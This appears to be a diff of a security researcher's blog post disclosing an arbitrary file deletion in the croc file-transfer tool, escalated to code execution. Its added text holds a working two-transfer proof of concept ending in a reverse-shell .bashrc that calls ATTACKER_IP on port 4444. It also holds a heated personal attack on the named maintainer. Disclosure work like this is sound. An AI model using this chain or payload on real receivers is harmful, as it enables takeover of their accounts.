@@ -1,76 +1,88 @@
 ---
-title: "CrocTears: Arbitrary File Deletion to RCE in croc"
-date: 2026-08-25
+title: "CrocTears: or How I Found an Arbitrary File Deletion That Can Be Escalated to RCE in croc"
+date: 2026-08-12
 draft: false
-tags: [croc, go, file-deletion, path-traversal, rce, cve]
+tags: [croc, go, file-deletion, path-traversal, rce, cve, 0day]
 ---
 
-## |=---[ Summary ]
-
-A malicious **sender** can delete arbitrary files (and empty directories) on a
-**receiver's** machine — anywhere the receiving user has permission — by sending
-a file named `croc-marked-files.txt`.
-
-croc uses that exact filename in the current working directory as its internal
-"delete these temp files on exit" list, and deletes every path it contains
-**without any validation**. Because a received file with that name lands in the
-receiver's working directory (the default receive location), the incoming file
-*becomes* the deletion list, and its contents are fully attacker-controlled.
-Deletion runs automatically when the transfer completes, and also on Ctrl-C.
+{{< img src="/img/croc-header.webp" path="/img/submissive-croc.png" caption="fig.0 — submissive croc" >}}
 
 {{< note >}}
-This research was conducted against software I control, reported to the
-maintainer, and is published after the fix shipped. For authorized security
-research and defensive use only.
+The fix landed in under an hour (PR #1232), but that was a silent fix. The
+commit carried no description, no security note, and no advisory — for a
+vulnerability that turned out to be a two-year-old remote-code-execution chain.
+
+The situation was made worse by the maintainer's subsequent handling of the
+disclosure. The maintainer refused to request a CVE ID and refused to give me
+credit for discovering and reporting the vulnerability. After several email
+exchanges, I was ultimately told that I should have created a PR myself. That
+is not an appropriate approach for a security vulnerability: a PR is public by
+design and would have disclosed the vulnerability before there was an
+appropriate coordinated disclosure process in place.
+
+Taken together, this shows a serious lack of security-disclosure hygiene and
+transparency toward users and security researchers. A vulnerability of this age
+and severity should be communicated, not quietly buried in a diff.
+
+I want to keep this focused on the technical write-up, but I have a lot more to
+say about the maintainer of croc. Let's just say that he lacks maturity,
+transparency, and honesty.
 {{< /note >}}
 
-## |=---[ Affected / Fixed ]
+## |=---[ TL;DR ]
 
-- **Product:** croc
-- **Vendor / author:** Zack Scholl (schollz)
-- **Package:** `github.com/schollz/croc` (Go)
-- **Affected versions:** `>= 10.0.13, <= 11.0.2`
-- **Fixed in:** commit `c0d51f0` (PR #1232) — release
-  [`11.0.3`](https://github.com/schollz/croc/releases/tag/v11.0.3)
+croc, the end-to-end-encrypted file-transfer tool, trusted a predictable
+filename in its working directory as an internal "delete these" list. A
+malicious sender could send a file with that name with arbitrary file paths as
+its content, causing the receiver to delete attacker-chosen files — absolute
+paths and `../` traversal both work. When the victim receives into their home
+directory, this can be chained to remote code execution by deleting and then
+sending files like `.bashrc`.
 
-## |=---[ Details ]
+```
+Affected:    croc 10.0.13 – 11.0.2
+Fixed in:    11.0.3  (commit c0d51f0, PR #1232)
+CVSS 3.1:    AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H  ->  8.1 (High)
+```
 
-Two functions in `src/utils/utils.go` implement a cleanup mechanism for
-temporary files:
+## |=---[ Background Knowledge ]
 
-- `const crocRemovalFile = "croc-marked-files.txt"` — a **fixed, relative** path
-  resolved against the current working directory.
-- `RemoveMarkedFiles()` opens that file and runs `os.Remove(line)` for **every
-  line, with no path validation and no confinement to the working directory**,
-  so absolute paths and `../` traversal are honored.
+croc lets two machines transfer files through a relay.
 
-`RemoveMarkedFiles()` is invoked on **normal exit** (`main.go:45`) and on
-**SIGINT/Ctrl-C** (`main.go:51`) after any receive.
+The detail that matters: **received files land in the CWD, and the sender fully
+controls their names and contents.**
 
-The receiver writes incoming top-level files into the current working directory
-(`FolderRemote = "./"`), and the name `croc-marked-files.txt` passes
-`utils.ValidFileName` — it is an ordinary basename with no separators.
+## |=---[ The Bug: a magic filename in your working directory ]
 
-As a result, a sender who sends a file **named** `croc-marked-files.txt` whose
-**contents** are a newline-separated list of victim paths causes those paths to
-be deleted on the receiver when croc exits.
+To clean up temporary files, croc kept an on-disk list and deleted everything in
+it on exit. In `src/utils/utils.go`:
 
-Relevant code:
+```go
+const crocRemovalFile = "croc-marked-files.txt"
 
-- `src/utils/utils.go` — `crocRemovalFile`, `MarkFileForRemoval`, `RemoveMarkedFiles`
-- `main.go:45` and `main.go:51` — cleanup invocation
-- the receive path, which writes top-level files to the CWD
+func RemoveMarkedFiles() (err error) {
+    f, err := os.Open(crocRemovalFile)   // fixed, RELATIVE path -> read from CWD
+    ...
+    for scanner.Scan() {
+        fname := scanner.Text()
+        err = os.Remove(fname)           // no validation, no CWD confinement
+    }
+    ...
+}
+```
 
-The paths are taken verbatim from attacker-controlled file content, so this is
-**External Control of File Name or Path** used in a delete operation, combined
-with **Path Traversal** (absolute / `../`).
+`RemoveMarkedFiles()` runs on normal exit (`main.go:45`) and on Ctrl-C
+(`main.go:51`). It reads `croc-marked-files.txt` from the current directory and
+calls `os.Remove()` on every line, with no path validation and no confinement,
+so absolute and relative paths both delete.
 
-## |=---[ PoC ]
+Hence, an attacker can send a file named `croc-marked-files.txt` that contains
+file paths as its content. Once the victim receives it, those files get
+automatically deleted.
 
-Using a local relay — nothing leaves the machine. On UNIX the code phrase is
-passed via `CROC_SECRET`.
+## |=---[ PoC #1: Arbitrary File Deletion ]
 
-**1. Attacker crafts and sends the payload:**
+Attacker crafts the list and sends it:
 
 ```bash
 mkdir -p /tmp/attacker && cd /tmp/attacker
@@ -78,59 +90,63 @@ printf 'secret.txt\n../victim-sibling.txt\n/tmp/absolute-target.txt\n' > croc-ma
 croc send croc-marked-files.txt
 ```
 
-**2. Victim receives into a directory containing valuable files:**
+Victim receives it into a directory with files they care about:
 
 ```bash
 mkdir -p /tmp/victim && cd /tmp/victim
-echo A > secret.txt                  # relative (CWD)
-echo B > /tmp/victim-sibling.txt     # the ../ target
+echo A > secret.txt
+echo B > /tmp/victim-sibling.txt     # reached via ../
 echo C > /tmp/absolute-target.txt    # absolute
-CROC_SECRET=<SECRET> croc --yes
+CROC_SECRET=<code> croc --yes
 ```
 
-**3.** On completion, `secret.txt`, the `../` target, and the absolute-path
-target are all deleted. The same occurs if the receiver presses Ctrl-C after the
-file has arrived.
+On completion, all three targets are deleted.
 
-Verified: CWD-relative, `../` traversal (escapes the receive directory), and
-absolute paths all delete. Deletion is attributable solely to the receiver.
+## |=---[ PoC #2: Escalating to RCE ]
 
-## |=---[ Impact ]
+Deletion alone is destructive, but it also removes the one thing standing
+between an attacker and code execution: **the overwrite prompt.**
 
-A peer you are **receiving from** can delete arbitrary files and empty
-directories owned by the receiving user — `~/.ssh/authorized_keys`, dotfiles,
-documents, project files. It triggers on normal completion, silently with
-`--yes`.
+croc won't silently overwrite an existing file. But if we delete the target
+first, the follow-up write lands with no prompt. Targeting a shell init file
+(e.g. `.bashrc`) leads to code execution.
 
-This far exceeds the expected "receive a file into this folder" trust boundary.
+**Transfer 1 — delete `~/.bashrc`:**
 
-## |=---[ Escalation: Arbitrary File Deletion -> RCE ]
+```bash
+# attacker
+printf '.bashrc\n' > croc-marked-files.txt
+croc send croc-marked-files.txt
 
-The same primitive — a sender fully controls the basename (dotfiles included)
-and the content of files written into the receive directory — escalates to code
-execution when the victim receives into their home directory.
+# victim (in $HOME)
+CROC_SECRET=<code1> croc --yes    # ~/.bashrc deleted on exit
+```
 
-**1. Bypass the overwrite prompt (using the deletion bug above).** Transfer 1
-sends `croc-marked-files.txt` whose contents list the victim's existing
-shell-init file, e.g. `.bashrc`. On exit, `RemoveMarkedFiles()` deletes it.
+**Transfer 2 — plant a malicious `.bashrc`:**
 
-{{< img src="/img/croc-01-delete-bashrc.png" path="transfer-1/croc-marked-files.txt" caption="fig.1 — transfer 1 deletes the victim's ~/.bashrc on exit" >}}
+```bash
+# attacker
+cat > .bashrc <<'EOF'
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+EOF
+croc send .bashrc
 
-**2. Plant a malicious init file.** Transfer 2 sends a file named `.bashrc`.
-Because the original was deleted, no overwrite prompt fires.
+# victim (in $HOME)
+CROC_SECRET=<code2> croc --yes    # no overwrite prompt (file was deleted)
+```
 
-{{< img src="/img/croc-02-plant-bashrc.png" path="transfer-2/.bashrc" caption="fig.2 — the malicious .bashrc lands with no overwrite prompt" >}}
+**Execution:** on the victim's next interactive shell / SSH login, `~/.bashrc`
+is sourced and the payload runs as the victim.
 
-**3. Delivery.** The victim runs `CROC_SECRET=<SECRET> croc … --yes` twice: the
-first transfer (`croc-marked-files.txt`) deletes `~/.bashrc` on exit, and the
-second writes the attacker's malicious `~/.bashrc` with no overwrite prompt.
+### Screenshots
 
-{{< img src="/img/croc-03-delivery.png" path="victim/$HOME" caption="fig.3 — both transfers accepted silently under --yes" >}}
+{{< img src="/img/croc-01-delete-bashrc.png" path="transfer-1/croc-marked-files.txt" caption="fig.1 — attacker deletes .bashrc" >}}
 
-**4. Execution.** The attacker's code runs as the victim on the next shell or
-login — for a server, on the next SSH login.
+{{< img src="/img/croc-02-plant-bashrc.png" path="transfer-2/.bashrc" caption="fig.2 — attacker sends new .bashrc" >}}
 
-{{< img src="/img/croc-04-execution.png" path="victim/$HOME/.bashrc" caption="fig.4 — code execution as the victim on next login" >}}
+{{< img src="/img/croc-03-delivery.png" path="victim/$HOME" caption="fig.3 — victim gets its .bashrc file replaced" >}}
+
+{{< img src="/img/croc-04-execution.png" path="attacker/nc -lvnp 4444" caption="fig.4 — next time the victim opens a shell, the attacker gets one too :D" >}}
 
 {{< note >}}
 The victim must run croc from $HOME so that its .bashrc is the one replaced —
@@ -148,18 +164,20 @@ prompt.
   the delete list honors `../` and absolute paths
 - **CWE-94:** Improper Control of Generation of Code
 
-**CVSS 3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` — base score
-**8.1 (High)**
-
 ## |=---[ Disclosure Timeline ]
 
 ```
-Aug 10, 2026  02:07 GMT+2   reported to the maintainer via GitHub Security
-                            Advisory and email
-Aug 10, 2026  02:53 GMT+2   fix merged in PR #1232, without response from
-                            the maintainer
-later                       CVE requested from MITRE
+2026-08-10  02:07:00 GMT+2   reported via GitHub Security Advisory
+2026-08-10  02:53:00 GMT+2   fix committed (c0d51f0)
+2026-08-10  02:55:57 GMT+2   v11.0.3 published
+later                        CVE requested from MITRE
 ```
+
+## |=---[ Takeaway ]
+
+- Don't work on projects that don't take security seriously.
+- Some maintainers that claim and swear by open source will refuse to give you
+  credit. Expose them! Expose them!
 
 ## |=---[ References ]
 
@@ -167,4 +185,5 @@ later                       CVE requested from MITRE
 - Fix commit: <https://github.com/schollz/croc/commit/c0d51f095e3bf91c94208c4db8101c4e60219b03>
 - Release: <https://github.com/schollz/croc/releases/tag/v11.0.3>
 
-Discovered and reported by Anas SOUIRI ([@elohim666](https://github.com/elohim666)).
+Found by Anas SOUIRI ([@0x1nf0](https://twitter.com/0x1nf0)).
+**Update to croc 11.0.3 or later.**
